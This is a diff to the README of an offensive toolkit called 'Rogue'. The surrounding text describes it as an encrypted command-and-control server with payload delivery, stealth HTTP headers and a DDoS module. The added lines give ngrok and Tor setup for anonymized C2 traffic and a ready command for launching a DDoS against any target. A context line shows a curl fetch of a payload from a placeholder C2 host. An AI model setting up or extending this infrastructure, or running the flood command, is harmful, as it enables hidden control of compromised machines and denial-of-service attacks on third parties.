@@ -30,6 +30,44 @@ sudo apt install python3-pycryptodome
 
 ---
 
+### Install ngrok (from rogue directory)
+
+```bash
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
+unzip ngrok-stable-linux-amd64.zip
+sudo mv ngrok /usr/local/bin/
+```
+
+Then authenticate: get your auth token: https://ngrok.com/
+
+```bash
+ngrok config add-authtoken <YOUR_NGROK_AUTH_TOKEN>
+```
+
+---
+
+## Tor Support 
+
+Install and start Tor:
+
+```bash
+sudo apt install tor
+pip3 install pysocks
+```
+to start tor:
+
+```bash
+sudo systemctl start tor@default
+```
+
+to check if tor is running: 
+
+```bash
+sudo systemctl status tor@default
+```
+
+---
+
 ## File Structure
 
 * `rogue_c2.py` – Encrypted command-and-control server
@@ -297,6 +335,14 @@ Best served over port 8000 like other payloads.
 * Uses stealth HTTP headers and randomized payloads
 * Supports optional Tor routing (`USE_TOR = True`) for anonymized C2 traffic
 * Threaded with per-method control over duration and concurrency
+* you can use the ddos script independently of rogue:
+
+  Ddos command structure:
+
+```bash
+python3 ddos.py trigger_ddos <target> <port> <duration> <threads> <mode>
+```
+
 
 ### `polyroot.py`
 
@@ -321,25 +367,6 @@ Or renamed:
 ```bash
 curl http://<C2_IP>:8000/.svc
 ```
-
----
-
-## Tor Support (DDoS Only)
-
-Install and start Tor:
-
-```bash
-sudo apt install tor
-pip3 install pysocks
-sudo systemctl start tor@default
-```
-
-Then run:
-
-```bash
-python3 ddos.py trigger_ddos <target> <port> <duration> <threads> <mode>
-```
-
 ---
 
 ## Extending Rogue
